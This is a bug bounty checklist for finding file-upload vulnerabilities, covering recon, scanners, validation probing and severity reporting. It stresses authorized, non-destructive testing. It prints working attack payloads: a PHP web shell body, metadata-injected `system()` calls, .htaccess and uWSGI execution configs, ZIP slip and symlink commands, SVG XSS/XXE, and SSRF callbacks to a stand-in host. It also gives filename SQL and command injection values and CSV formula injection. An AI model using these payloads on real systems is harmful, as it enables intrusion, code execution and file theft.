# File Upload Vulnerabilities — Bug Bounty Hunting Checklist

> **Severity mindset:** Stored XSS / SSRF / metadata leak via upload → Medium. Arbitrary file read (LFI/XXE/JSON-path) → High. Code execution (web shell, config-based, polyglot, ZIP slip to webroot) → Critical. Always identify *what is validated* first, then defeat exactly that control.

> **Scope reminder:** Only test authorized targets. **Do NOT overwrite existing files** (`web.config`, `.htaccess`, `index.php`) on live targets — it can DoS the entire site. Prove impact minimally: a benign marker file, `phpinfo()`, an `echo`'d random string, or an OOB DNS/HTTP callback. Don't drop full interactive shells, don't establish persistence, don't read other users' uploads. One `phpinfo()` page or one DNS hit proves the bug.

---

## Two Preconditions for Exploitability

Before going deep, confirm both — without them most upload bugs are not exploitable:

1. **Retrievable** — you can reach the uploaded file (predictable URL, returned path/ID, CDN link, or an inclusion sink). No retrieval path = no RCE/XSS.
2. **Content-Type / execution not neutralized** — server doesn't force `application/octet-stream`, `Content-Disposition: attachment`, store outside webroot, or strip/re-encode the file. Note where it lands (same origin? sandbox CDN? S3?).

---

## Concept Distinctions

| Outcome | Trigger | Severity |
| --- | --- | --- |
| **Code execution** | Executable file lands in webroot & is requested (or config forces execution) | Critical |
| **Config-based RCE** | `.htaccess`/`web.config`/`uwsgi.ini`/`.pth` parsed by server | Critical |
| **Parser/archive RCE** | ZIP slip to webroot, polyglot, ImageMagick/ffmpeg | Critical |
| **Arbitrary file read** | SVG/XML XXE, `zip://`+LFI, JSON-body filepath, path traversal | High |
| **Stored XSS** | SVG/HTML/filename rendered same-origin | Medium–High |
| **SSRF** | URL-fetch upload, SVG external ref, ImageMagick MVG/MSL | Medium–High |
| **Injection via filename** | Filename concatenated into SQL/shell/template | Medium–Critical |
| **Info disclosure / DoS** | EXIF leak, ImageMagick memory disclosure, pixel-flood | Low–Medium |

---

## Phase 1 — Recon & Discovery

### 1.1 Find every upload surface
- [ ] Obvious: avatar/profile pic, logo, banner, attachment, document/CSV import, resume, ID/KYC, "import settings"
- [ ] Hidden: rich-text editors (image paste), bulk import, ticket/comment attachments, API `multipart/form-data` endpoints
- [ ] Non-multipart vectors: base64 in JSON body (`"file": "data:image/png;base64,..."`), raw `PUT`, GraphQL upload mutations, URL-fetch ("import from URL" → also test SSRF)
- [ ] Spider for forms + grep JS for `FormData`, `enctype="multipart/form-data"`, `upload`, `presignedUrl`, `/s3`, `acceptedTypes`

### 1.2 Fingerprint the backend (decides which payloads matter)
```bash
# Server + language headers
curl -sI https://target.com | grep -iE 'server|x-powered-by|x-aspnet'
# .php / .aspx / .jsp responses anywhere? -> tells you which shell extension to aim for
```
Apache → `.htaccess` + `.php`. IIS/ASP → `web.config` + `.aspx/.config`. Tomcat/Jetty → `.jsp/.war/.xml`. Python/uWSGI → `.ini/.pth`. Node → `.js`/package hooks.

### 1.3 Find the retrieval location (the make-or-break step)
- [ ] Note the URL/path/ID returned after upload
- [ ] Is it same-origin (executable risk) or a sandboxed CDN/S3 bucket (XSS may be neutered)?
- [ ] Can you predict the stored filename? (`uniqid()`, timestamp, sequential ID → brute-forceable; see race-condition §6.5)
- [ ] Fuzz common upload dirs: `/uploads/ /files/ /images/ /media/ /tmp/ /attachments/ /user/<id>/`

---

## Phase 2 — Automated Scanning

### 2.1 Fuxploider (find what's accepted + executable)
```bash
python3 fuxploider.py --url https://target.com/upload --not-regex "wrong file type"
# Fuzzes extension+MIME combos, then tries to execute what lands
```

### 2.2 Burp UploadScanner / File Upload Traverser
- **UploadScanner** — sends malicious variants (RCE, XXE, SSRF, XSS, ImageTragick, polyglots) in one pass.
- **File Upload Traverser** — focuses on path traversal in the filename / upload path.

### 2.3 image-upload-exploits + nuclei
```bash
# Pre-built malicious images (polyglots, ImageTragick, pixel-flood)
# https://github.com/barrracud4/image-upload-exploits

# Custom nuclei DAST: multipart upload + retrieve + matcher, with interactsh OOB
nuclei -l upload_endpoints.txt -dast -tags upload -o nuclei_upload.txt
interactsh-client -v   # catch SVG/XXE/SSRF callbacks from uploaded files
```

---

## Phase 3 — Detect What Is Actually Validated

Probe the control before bypassing it. Upload a benign valid image first (baseline), then change one variable at a time:

- [ ] **Extension check?** Upload `test.php` with valid image content → blocked? = extension allowlist/blacklist exists
- [ ] **Content-Type check?** Upload `.php` but set `Content-Type: image/png` → accepted? = MIME-only validation (weak)
- [ ] **Magic-byte/content check?** Upload `.php` with `GIF89a;` prefix → accepted? = signature check
- [ ] **Image re-processing?** Compare uploaded vs served bytes — re-encoded? = GD/ImageMagick rewrite (needs chunk-survival payloads, §6.4)
- [ ] **Filename kept or randomized?** Determines filename-injection + retrieval predictability
- [ ] **Where stored / executes?** Request your benign file back; is it served inline with the right type?

> Knowing it's "MIME-only" vs "magic-byte" vs "re-encoding" tells you exactly which Phase-4/6 trick to use — don't fuzz blind.

---

## Phase 4 — Filter-Bypass Matrix

### 4.1 No / client-side-only validation
```
# HTML accept="" or JS check only — intercept and swap back to the real extension
1. Upload allowed.png  2. Intercept  3. Rename to shell.php + set real content
```

### 4.2 Extension blacklist bypass
```
# Obscure executable extensions (pick per backend, see Appendix A)
.php2 .php3 .php4 .php5 .php7 .pht .phtml .phtm .phar .phps .pgif .inc .shtml
.asp .aspx .config .cer .asa .ashx .asmx .soap        (IIS)
.jsp .jspx .jspf .jsw .jsv .war                        (Tomcat/Jetty)

# Case variation (validator case-sensitive, server isn't)
shell.pHp   shell.PHP5   shell.PhAr   shell.aSp

# Double / reverse-double extension
shell.php.jpg            (whitelist sees .jpg)
shell.jpg.php            (Apache executes rightmost known handler)
shell.php.blah123jpg     (unknown trailing ext, Apache falls back to .php)

# Trailing chars (stripped by server, defeat exact-match blacklist)
shell.php%20   shell.php%00.jpg   shell.php.   shell.php......   shell.php/
shell.php%0a   shell.php%0d%0a.jpg   shell.php#.png   shell.php:.jpg

# Recursive-strip flaw (blacklist removes ".php" once)
shell.p.phphp   shell.pphphp

# Unicode / homoglyph / RTLO
shell.%E2%80%AEphp.jpg   -> renders name.gpj.php (RTLO)
shell.ｐhp                -> fullwidth p, fools string match

# Windows NTFS ADS + 8.3 shortname
file.asax:.jpg   file.asp::$DATA   web~1.con
file.asp;.jpg    (IIS6 semicolon)

# Length truncation (filesystem caps at 255; wget at 236)
AAAA...[232]...AAAA.php.jpg   -> trailing ext truncated off, leaving .php
```

### 4.3 Content-Type (MIME) spoofing
```
# Swap the multipart part's Content-Type to an allowed one
Content-Type: image/png   (or image/gif, image/jpeg, text/plain)
# Also try: duplicate/conflicting Content-Type headers, application/octet-stream catch-all
```

### 4.4 Magic-byte / content-signature bypass
```
GIF89a;
<?php echo shell_exec($_GET['c']); ?>           # GIF prefix + PHP body

# Prepend real signatures (Appendix B), keep payload after:
PNG: \x89PNG\r\n\x1a\n     JPG: \xFF\xD8\xFF     PDF: %PDF-

# Metadata injection (survives naive signature checks)
exiftool -Comment='<?php system($_GET["c"]); __halt_compiler(); ?>' img.jpg
# Alternative PHP tags if <?php is filtered:
<?=`$_GET[0]`?>           <script language="php">...</script>
```

---

## Phase 5 — Server-Config RCE (upload a config, not a shell)

> These force the server to execute otherwise-inert files. **Never overwrite an existing `.htaccess`/`web.config`** — only upload where none exists, and prefer a fresh subdirectory.

### 5.1 Apache `.htaccess` — map a benign extension to PHP
```apache
# Upload as .htaccess, then upload shell.j4x containing PHP
AddType application/x-httpd-php .j4x
# or: AddHandler application/x-httpd-php .j4x
```
Self-contained variants: https://github.com/wireghoul/htshells

### 5.2 IIS `web.config` — execute uploaded content
Upload a `web.config` that registers a handler or contains classic-ASP in `<%   %>`. (Confirm none exists first.)

### 5.3 uWSGI `.ini` — magic-variable RCE on parse
```ini
[uwsgi]
; executes during config parse
foo = @(exec://whoami)
```
Also `@(call://...)`, `@(http://...)`, `@(fd://...)`.

### 5.4 Python `.pth` — code runs at interpreter startup
A `.pth` in site-packages with a line starting `import ...` executes on next Python start.

### 5.5 Java app servers
- **Jetty:** upload `.xml` to `$JETTY_BASE/webapps/` → auto-processed (XML bean RCE); `.war` similarly.
- **Tomcat:** path-traversal the upload to `webapps/ROOT/shell.jsp` (e.g. `..%2f..%2fwebapps%2fROOT`), optionally with `Content-Encoding: gzip`.

### 5.6 Dependency-manager hooks
- `package.json` `"scripts": {"prepare": "..."}` / `composer.json` `pre-command-run` — RCE when the manager runs in CI/build.

---

## Phase 6 — Parser & Archive Abuse

### 6.1 ZIP Slip (path traversal on extract)
```bash
# evilarc: write outside the extraction dir into webroot
python2 evilarc.py -o unix -d 5 -p var/www/html/ shell.php
# entries like ../../../var/www/html/shell.php
```

### 6.2 ZIP + symlink (read source files)
```bash
ln -s ../../../etc/passwd link.txt
zip --symlinks out.zip link.txt   # extraction follows symlink
```

### 6.3 ZIP parser-disagreement tricks (validator vs extractor see different files)
- **NUL-byte filename smuggling:** hex-edit a ZIP entry to `shell.php\x00.pdf`. PHP `ZipArchive` truncates at NUL → writes `shell.php`, while the validator sees `.pdf`. Hide valid PDF content so MIME checks pass.
- **Stacked/concatenated ZIPs:** `cat benign.zip evil.zip > combined.zip`. Validator reads the first EOCD (benign), extractor reads the second (malicious).
- **`zip://` + LFI:** if a `?page=`/include sink exists, `zip://uploaded.zip%23shell.php`.

### 6.4 Image-processing survival (when the app re-encodes images)
- **PNG:** payload in **PLTE / IDAT / tEXt** chunks survives `imagecopyresized` / `thumbnailImage`. Generators: synacktiv **astrolock**, `createPNGwithPLTE.php`.
- **JPG:** `createBulletproofJPG.py`. **GIF:** `createGIFwithGlobalColorTable.php`.

### 6.5 Race condition (TOCTOU)
```
# File is executable in a temp dir for milliseconds before validation/deletion.
# Turbo Intruder: upload shell + flood requests to its predicted path in parallel.
# URL-fetch uploads using uniqid()/timestamp names are brute-forceable.
```

### 6.6 Polyglots (pass a content check AND execute)
```
PHAR-JPEG   — valid JPEG + PHP archive, executed via include/phar://
PDF/ZIP     — %PDF magic in first 1024 bytes + real ZIP (defeats mmmagic/pdflib)
GIFAR       — valid GIF + RAR/ZIP
GIF/JS      — passes image check, runs as JS when included as <script src>
```

### 6.7 ImageMagick / ffmpeg
```
# ImageTragick (CVE-2016-3714) — SSRF/RCE via MVG/MSL/SVG processed by convert
push graphic-context
viewbox 0 0 640 480
fill 'url(http://OOB.example.net/)'        # SSRF proof (swap for cmd on vuln versions)
pop graphic-context

# CVE-2022-44268 — PNG with -text profile leaks arbitrary file on re-encode
# gifoeb — GIF-based ImageMagick memory disclosure:
./gifoeb gen 512x512 dump.gif ; ./gifoeb recover $p | strings

# ffmpeg HLS — malicious .m3u8/AVI reads local files via ffmpeg -i
```

---

## Phase 7 — Non-RCE Impact (where most bounties actually land)

### 7.1 SVG → XSS / XXE / SSRF (when SVG is served same-origin & inline)
```xml
<!-- Stored XSS -->
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>

<!-- XXE / file read -->
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>

<!-- SSRF / OOB (also cloud metadata 169.254.169.254) -->
<svg xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://OOB.example.net/" height="10" width="10"/>
</svg>
```
> Bypass that wants `.png`? Many filters check only extension → `payload.svg.png` still parses as SVG when served. (Real $1k chain: SVG renamed `.svg.png` → stored XSS → `prompt()` credential theft.)

### 7.2 Filename-based server-side injection
```
# SQLi (filename concatenated into a query)
'sleep(10)-- -.jpg        sleep(10)-- -.png

# Command injection (filename passed to a shell)
a$(whoami)z.jpg     a`whoami`z.jpg     a;sleep 10;z.jpg

# Stored XSS via filename (reflected unencoded in a listing)
"><img src=x onerror=alert(document.domain)>.png

# Path traversal write via filename
../../../var/www/html/shell.png     ..%2f..%2f..%2ftmp%2fx.png
```

### 7.3 JSON-body / parameter file-path abuse (arbitrary read)
```
# Server copies a file from a path you control in the body
{"files":[{"filename":"x","filepath":"/proc/self/environ"}]}
# Targets: /proc/self/environ, app config (.env, ~/.n8n/config), DB files
```

### 7.4 CSV / formula injection
```
=cmd|'/c calc'!A1        @SUM(1+1)*cmd        =HYPERLINK("http://OOB","x")
# Fires when an admin/other user re-exports & opens the sheet.
```

### 7.5 Info disclosure & DoS
- [ ] **EXIF/metadata leak** — uploaded images served with GPS/device data intact
- [ ] **Pixel-flood DoS** — tiny file, huge declared dimensions (e.g. 64250×64250) exhausts memory
- [ ] **Decompression bomb / ReDoS filename** — only if program permits availability testing

### 7.6 Other quick wins
- [ ] **URL-fetch upload → SSRF** ("import from URL" pointing at internal IP / metadata)
- [ ] **Stored HTML/XHTML** served inline → XSS / open redirect
- [ ] **Service worker** — uploaded `.js` registerable on a controlled path → persistent XSS
- [ ] **CSRF on the upload** itself (no token) → plant content in victim's account

---

## Phase 8 — Minimal, Non-Destructive PoC Validation

Prove exactly one safe primitive per bug class — then stop:

```bash
# Code execution — benign marker, NOT a shell
echo '<?php echo "j4x-rce-"."ok"; phpinfo(); ?>' > p.php   # request -> see "j4x-rceok"/phpinfo

# Config RCE — same benign marker via the mapped extension

# SVG XSS — alert(document.domain) screenshot is enough (don't deploy real stealers)

# XXE / file read — read a benign file (/etc/hostname), not secrets

# SSRF / ImageMagick — DNS/HTTP hit on YOUR interactsh; do not pivot internally

# Filename SQLi/CMDi — timing proof (sleep 10) only

# Confirm retrieval + execution context
curl -sI https://target.com/uploads/p.php   # Content-Type? executed or downloaded?
```

---

## Phase 9 — Reporting

### Severity Matrix
| Finding | Severity |
| --- | --- |
| EXIF leak / metadata not stripped | Low |
| Pixel-flood / DoS (if in scope) | Low–Medium |
| Stored XSS (SVG/HTML/filename), same-origin | Medium–High |
| SSRF via upload (incl. cloud metadata) | High |
| Arbitrary file read (XXE / zip:// / JSON-path) | High |
| Code execution (web shell / config / polyglot / ZIP slip) | Critical |
| Unauthenticated upload → any of the above | +1 severity bump |

### Pre-Submission Checklist
- [ ] Non-destructive proof only (marker/phpinfo/DNS callback/benign file)
- [ ] Did **not** overwrite existing server files; uploaded to a fresh path
- [ ] Documented endpoint, parameter, exact bypass, and retrieval URL
- [ ] Stated which validation was present and how it was defeated
- [ ] Execution context confirmed (served inline same-origin vs sandboxed CDN)
- [ ] Impact narrative beyond "I uploaded a file" — what an attacker reaches

### Minimal PoC Template
```
Endpoint:        POST /api/avatar  (multipart field: file)
Validation:      Content-Type allowlist only (image/*)
Bypass:          filename=shell.php, Content-Type: image/png, body GIF89a;<?php ...
Retrieval:       https://target.com/uploads/<id>/shell.php  (served as application/x-httpd-php)
PoC (safe):      curl https://target.com/uploads/<id>/shell.php  -> "j4x-rceok" + phpinfo()
Impact:          Unauthenticated RCE as www-data; full host compromise (proven with phpinfo only).
```

---

## Appendix A — Executable Extensions by Server
```
PHP:        .php .php2 .php3 .php4 .php5 .php7 .pht .phps .phar .phpt .pgif .phtml .phtm .inc .shtml
ASP/IIS:    .asp .aspx .config .cer .asa .ashx .asmx .aspq .axd .soap   (shell.aspx;1.jpg ; ::$DATA)
JSP/Java:   .jsp .jspx .jsw .jsv .jspf .wss .do .action .war  (Jetty .xml)
Perl:       .pl .pm .cgi .lib        ColdFusion: .cfm .cfml .cfc .dbm
Python:     .py .pth (startup)       uWSGI: .ini       Node.js: .js .json .node
Config-RCE: .htaccess  web.config  uwsgi.ini  .pth  package.json  composer.json
```

## Appendix B — Magic Bytes (prefix to defeat signature checks)
```
PNG: \x89PNG\r\n\x1a\n     JPG: \xFF\xD8\xFF     GIF: GIF89a; / GIF87a
PDF: %PDF-                 ZIP: PK\x03\x04        BMP: BM
```

## Appendix C — Non-Executable Types to Abuse for Other Bugs
```
.svg       -> Stored XSS, XXE, SSRF, open redirect
.gif/.png  -> XSS, IDAT/PLTE-embedded payloads, ImageMagick memory disclosure
.csv/.xls  -> formula/CSV injection
.html/.xhtml -> Stored XSS, open redirect
.zip       -> Zip Slip, symlink read, zip:// + LFI, NUL/stacked smuggling
.xml       -> XXE
image      -> ImageMagick MVG/MSL SSRF & RCE (ImageTragick)
```

## Appendix D — Tool Stack Reference
| Tool | Purpose | Install / Source |
| --- | --- | --- |
| `fuxploider` | Auto-detect accepted + executable types | `git clone https://github.com/almandin/fuxploider` |
| UploadScanner | Burp ext — many malicious variants | https://github.com/portswigger/upload-scanner |
| File Upload Traverser | Burp ext — path traversal in filename | https://github.com/portswigger/file-upload-traverser |
| `htshells` | Ready-made `.htaccess` execution tricks | https://github.com/wireghoul/htshells |
| `evilarc` | Zip Slip archive generator | https://github.com/ptoomey3/evilarc |
| `gifoeb` | ImageMagick GIF memory disclosure | https://github.com/neex/gifoeb |
| image-upload-exploits | Pre-built malicious images/polyglots | https://github.com/barrracud4/image-upload-exploits |
| `exiftool` | Metadata/EXIF payload injection | `apt install libimage-exiftool-perl` |
| `nuclei` + `interactsh-client` | Templated upload checks + OOB confirmation | `go install .../nuclei/v3/cmd/nuclei@latest` |

## Appendix E — Useful Wordlists
```
PayloadsAllTheThings/Upload Insecure Files/        (extensions, htaccess, web.config, zip slip, imagemagick)
SecLists/Discovery/Web-Content/raft-*-files.txt    (upload dir discovery)
fuzzdb/attack/file-upload/                          (malicious images, lottapixel.jpg)
```

---

## References
- PortSwigger File Upload: https://portswigger.net/web-security/file-upload
- PayloadsAllTheThings — Upload Insecure Files: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md
- HackTricks File Upload: https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-upload/README.md
- OWASP Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- OWASP WSTG — Upload of Unexpected File Types: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types
- Intigriti — Advanced File Upload guide: https://www.intigriti.com/researchers/blog/hacking-tools/insecure-file-uploads-a-complete-guide-to-finding-advanced-file-upload-vulnerabilities
- YesWeHack Part 1 / Part 2: https://www.yeswehack.com/learn-bug-bounty/file-upload-attacks-part-1
- HowToHunt File Upload: https://github.com/KathanP19/HowToHunt/blob/master/File_Upload/file_upload.md
- OnSecurity checklist: https://onsecurity.io/article/file-upload-checklist/
- PortSwigger labs (verify payloads): web-shell upload, race condition, polyglot, .htaccess, traversal
- Full article reference library: [[1-Refreces/ARTICLES/ATTACK/FILE-UPLOAD]]
